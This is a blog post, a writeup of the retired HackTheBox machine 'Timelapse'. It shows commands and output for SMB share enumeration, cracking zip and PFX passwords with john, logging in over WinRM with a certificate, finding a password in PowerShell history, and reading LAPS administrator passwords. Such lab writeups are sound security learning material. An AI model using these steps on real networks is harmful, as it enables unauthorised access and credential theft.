@@ -1,0 +1,432 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This article is a writeup about a retired HacktheBox machine: Timelapse publish on Mars 2022 by d4rkpayl0ad. This box is rated as an easy machine. It implies a SMB share, a encrypted zip archive, a certificate, a password in a shell history and LAPS." name="description"/>
+<meta content="security, boot2root, HTB, SMB, LAPS" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Timelaps" property="og:title"/>
+<meta content="This article is a writeup about a retired HacktheBox machine: Timelapse publish on Mars 2022 by d4rkpayl0ad. This box is rated as an easy machine. It implies a SMB share, a encrypted zip archive, a certificate, a password in a shell history and LAPS." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2022/08/htb-timelaps.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2022-08-22 18:55:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="SMB" property="article:tag"/>
+<meta content="LAPS" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Timelaps</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
+<p>Offensive security tales</p>
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
+                  About
+                </a>
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
+                  Notes
+                </a>
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
+                  Tools
+                </a>
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
+<article class="single">
+<header>
+<h1 id="htb-timelaps">HTB: Timelaps</h1>
+<p>
+      Posted on 22 Aug 2022 in <a href="../../category/security.html">security</a>
+
+        • 6 min read
+    </p>
+</header>
+<div>
+<p><img alt="Timelaps Card" class="align-left" src="/media/2022.08/timelaps_card.png" width="262"/></p>
+<p>This article is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.com/home/machines/profile/452">Timelapse</a> publish on
+Mars 2022 by
+<a href="https://www.hackthebox.com/home/users/profile/168546">d4rkpayl0ad</a>.
+This box is rated as an easy machine. It implies a SMB share, a encrypted zip archive,
+a certificate, a password in a shell history and LAPS.</p>
+<h1>Foothold and user</h1>
+<h2>Recon</h2>
+<p>I started with an <code>nmap</code> scan. A few ports are open.</p>
+<div class="highlight"><pre><span></span><code># Nmap 7.92 scan initiated Sat Jun 11 10:49:58 2022 as: nmap -sSV -oN notes.md 10.129.71.83
+Nmap scan report for 10.129.71.83
+Host is up (0.014s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-06-10 22:50:08Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jun 11 10:50:14 2022 -- 1 IP address (1 host up) scanned in 15.85 seconds
+</code></pre></div>
+<p>Port 445 and 139 were open. I checked the available shares using <code>smbclient</code>.</p>
+<div class="highlight"><pre><span></span><code>└─$ smbclient -L 10.129.71.83
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Shares          Disk
+        SYSVOL          Disk      Logon server share
+</code></pre></div>
+<p>I connected to the <code>Shares</code> folder.</p>
+<div class="highlight"><pre><span></span><code>└─$ smbclient //10.129.71.83/Shares
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Oct 25 11:39:15 2021
+  ..                                  D        0  Mon Oct 25 11:39:15 2021
+  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
+
+                6367231 blocks of size 4096. 1269200 blocks available
+
+smb: \&gt; ls HelpDesk\
+  .                                   D        0  Mon Oct 25 11:48:42 2021
+  ..                                  D        0  Mon Oct 25 11:48:42 2021
+  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
+  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
+  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
+  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
+
+                6367231 blocks of size 4096. 1260315 blocks available
+</code></pre></div>
+<p>I grabbed everything there is in the <code>HelpDesk</code> folder.</p>
+<ul>
+<li><code>LAPS.x64.msi</code> is the install program for LAPS</li>
+<li>The <code>docx</code> files are old documentation</li>
+</ul>
+<p>Nothing interesting, I tooked a look in the <code>Dev</code> folder</p>
+<div class="highlight"><pre><span></span><code>smb: \Dev\&gt; ls
+  .                                   D        0  Mon Oct 25 15:40:06 2021
+  ..                                  D        0  Mon Oct 25 15:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021
+
+                6367231 blocks of size 4096. 1269072 blocks available
+smb: \Dev\&gt; get winrm_backup.zip
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (44.0 KiloBytes/sec) (average 44.0 KiloBytes/sec)
+</code></pre></div>
+<p>The zip archive is protected with a password. I used <code>zip2john</code> to extract the password
+hash from the archive and feed it to john using the <code>rockyou</code> wordlist. The password
+was immediatly found: <code>supremelegacy</code>.</p>
+<div class="highlight"><pre><span></span><code>→ john hash -w=~/tools/password_lists/rockyou.txt
+Loaded 1 password hash (PKZIP [32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
+1g 0:00:00:00 DONE (2022-06-11 17:10) 3.225g/s 11204Kp/s 11204Kc/s 11204KC/s suziexx..supergau
+Session completed
+</code></pre></div>
+<p>I decompressed the archive using the password and got a file named <code>legacyy_dev_auth.pfx</code>. The <code>.pfx</code> files are
+certificate (private an public keys) that can be used for authentication.</p>
+<p>The certificate was protected by a password. So I used <code>pfx2john</code> and feed it to john (again)
+and I got the password in a few seconds (again) still using the <code>rockyou</code> wordlist.</p>
+<div class="highlight"><pre><span></span><code>→ john hash -w=~/tools/password_lists/rockyou.txt
+0g 0:00:00:03 0.79% (ETA: 17:28:34) 0g/s 44418p/s 44418c/s 44418C/s GATORS..14411441
+thuglegacy       (legacyy_dev_auth.pfx)
+1g 0:00:01:30 DONE (2022-06-11 17:23) 0.01101g/s 35599p/s 35599c/s 35599C/s thuglife03282006..thscndsp1
+Session completed
+</code></pre></div>
+<p>Using openssl I extracted the public private keys from the certificate (I used the same
+password for the PEM pass phrase)</p>
+<div class="highlight"><pre><span></span><code>openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
+Enter Import Password:
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+</code></pre></div>
+<p>I used <code>evil-winrm</code> to connect to the target using the certifiactes and grabbed the user flag.</p>
+<div class="highlight"><pre><span></span><code>└─$ evil-winrm -S -c cert.crt -k key.pem -i 10.129.71.83 #thuglegacy
+
+Evil-WinRM shell v3.3
+Enter PEM pass phrase:
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; type ..\Desktop\user.txt
+e7ac7c0f7d766c0f21f4005e1758af50
+</code></pre></div>
+<h1>Root</h1>
+<p>I checked my privileges on the box, but nothing interesting.</p>
+<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= ============================================
+timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</code></pre></div>
+<p>I used <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a>
+and found that there is a PowerShell history file in the <code>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</code>
+folder.</p>
+<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; upload winPEAS.bat
+Info: Uploading winPEAS.bat to C:\Users\legacyy\Documents\winPEAS.bat
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; .\winPEAS.bat
+Enter PEM pass phrase:
+winPEAS.bat : The system cannot find the batch label specified - SetOnce
+    + CategoryInfo          : NotSpecified: (The system cann...ified - SetOnce:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+The system cannot find the batch label specified - ColorLineThe system cannot find the batch label specified - ColorLineThe system cannot find the batch label specified - ColorLinePowerShell v2 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
+    PowerShellVersion    REG_SZ    2.0
+
+PowerShell v5 Version
+&lt;SNIP&gt;
+Transcriptions Settings:
+Module logging settings:
+Scriptblog logging settings:
+
+PS default transcript history
+
+Checking PS history file
+ Volume in drive C has no label.
+ Volume Serial Number is 22CC-AE66
+
+ Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+03/04/2022  12:46 AM               434 ConsoleHost_history.txt
+               1 File(s)            434 bytes
+               0 Dir(s)   5,256,929,280 bytes free
+</code></pre></div>
+<p>The file contained a password to run as <code>svc_deploy</code> including the account password.</p>
+<div class="highlight"><pre><span></span><code>whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+</code></pre></div>
+<p>I used it as it was checking <code>svc_deploy</code> privileges. The account was part of the <code>LAPS_Readers</code> group.</p>
+<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /all}
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== ============================================
+timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+</code></pre></div>
+<p>I used a simple <a href="https://smarthomepursuits.com/export-laps-passwords-powershell/">commande</a> to retrieve the LAPS password.</p>
+<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
+PSComputerName              : localhost
+RunspaceId                  : e7ea358f-6d9c-47d5-b26a-2505848b8b58
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-Mcs-AdmPwd               : 3S5cxvMIgY{D9a2eP%l4}QOs
+ms-Mcs-AdmPwdExpirationTime : 133000468494251195
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+&lt;SNIP&gt;
+</code></pre></div>
+<p>I was able to connect as <code>administrator</code> using the retreived password and get the root 
+lag (which was located for an obscure reason on <code>TRX</code> desktop).</p>
+<div class="highlight"><pre><span></span><code>└─$ evil-winrm -u administrator -p '3S5cxvMIgY{D9a2eP%l4}QOs' -i 10.129.227.105 -S ./ #thuglegacy
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+timelapse\administrator
+*Evil-WinRM* PS C:\Users\Administrator&gt; type ..\TRX\Desktop\root.txt
+0af718d3f4fe2658a8e38e07fa8a0a4e
+</code></pre></div>
+<h1>Wrapping up</h1>
+<p>An interesting and easy box, cracking the zip password and just after the PFX file seems a bit redundant.
+Having the commands to run a process as another user in the PowerShell history file is nice
+as it might avoid some headaches.</p>
+</div>
+<div class="tag-cloud">
+<p>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/smb.html">SMB</a>
+<a href="../../tag/laps.html">LAPS</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2022/06/htb-paper.html" title="HTB: Paper">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2022/08/htb-late.html" title="HTB: Late">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
+</p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
+</p><p>
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " maggick's logs ",
+  "url" : "../..",
+  "image": "https://maggick.fr/media/image.png",
+  "description": ""
+}
+</script>
+</body>
+</html>
